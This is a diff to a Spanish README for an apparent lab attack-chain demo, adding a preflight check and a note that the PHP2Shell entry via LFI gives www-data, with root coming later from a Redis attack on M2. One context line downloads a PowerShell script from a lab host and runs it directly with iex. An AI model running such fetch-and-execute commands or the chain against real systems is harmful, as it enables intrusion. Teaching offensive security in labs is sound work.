@@ -74,6 +74,7 @@ iwr http://10.10.10.20:8000/bootstrap.ps1 -UseBasicParsing | iex
 
 ```bash
 # en M6
+bash lab/chain/00-preflight.sh --full   # FAIL=0 antes de la demo
 bash lab/tests/smoke.sh
 
 # en cada VM, tras instalar
@@ -90,6 +91,11 @@ bash /opt/lab/lab/m1/verify.sh
 
 **Objetivo:** `www-data` en M1.
 **Vulnerabilidad:** `session.upload_progress` + sink LFI del plugin `legacy-download`.
+
+> **Importante:** PHP2Shell da **`www-data`, no `root`**. Y no hace falta root en M1:
+> el salto 2 ataca Redis en M2 por red. Si en la réplica alguien espera `uid=0`
+> aquí, la respuesta es: "el primer salto da el usuario del servicio web; root
+> llega en M2".
 
 ### 2.1 Comprobación previa
 
@@ -345,6 +351,9 @@ bash lab/chain/05-m4-to-m5.sh --run
 ## 7. Demo completa (orden de la sustentación)
 
 ```bash
+# 0. comprobar que todo está en su sitio (FAIL=0)
+bash lab/chain/00-preflight.sh --full
+
 # 1. entrada
 bash lab/chain/01-m1-php2shell.sh --run        # uid=33(www-data)
 
